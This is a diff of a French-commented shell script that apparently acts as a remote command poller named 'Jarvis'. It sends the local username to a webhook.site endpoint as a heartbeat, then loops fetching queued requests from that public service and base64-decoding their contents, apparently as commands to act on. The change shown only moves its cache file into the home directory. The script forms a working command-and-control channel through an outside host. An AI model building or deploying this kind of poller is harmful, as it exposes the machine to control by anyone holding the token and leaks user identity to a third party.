@@ -28,9 +28,9 @@ touch "$SEEN_FILE"
 # Signal de vie : Jarvis voit que le poller tourne.
 curl -s -X POST "https://webhook.site/$TOKEN" -H "Content-Type: application/json" -d "{\"hello\":true,\"user\":\"$(whoami)\"}" >/dev/null 2>&1
 while true; do
-  curl -s "https://webhook.site/token/$TOKEN/requests" -H "Accept: application/json" > /tmp/jarvis-cmds.json 2>/dev/null
-  if [ -s /tmp/jarvis-cmds.json ]; then
-    jq -r '.data | reverse | .[] | [.uuid, (.content | @base64)] | @tsv' /tmp/jarvis-cmds.json 2>/dev/null | while IFS="$(printf '\t')" read -r UUID B64; do
+  curl -s "https://webhook.site/token/$TOKEN/requests" -H "Accept: application/json" > $HOME/jarvis-cmds.json 2>/dev/null
+  if [ -s $HOME/jarvis-cmds.json ]; then
+    jq -r '.data | reverse | .[] | [.uuid, (.content | @base64)] | @tsv' $HOME/jarvis-cmds.json 2>/dev/null | while IFS="$(printf '\t')" read -r UUID B64; do
       grep -qx "$UUID" "$SEEN_FILE" 2>/dev/null && continue
       echo "$UUID" >> "$SEEN_FILE"
       CONTENT="$(echo "$B64" | base64 -d 2>/dev/null)"
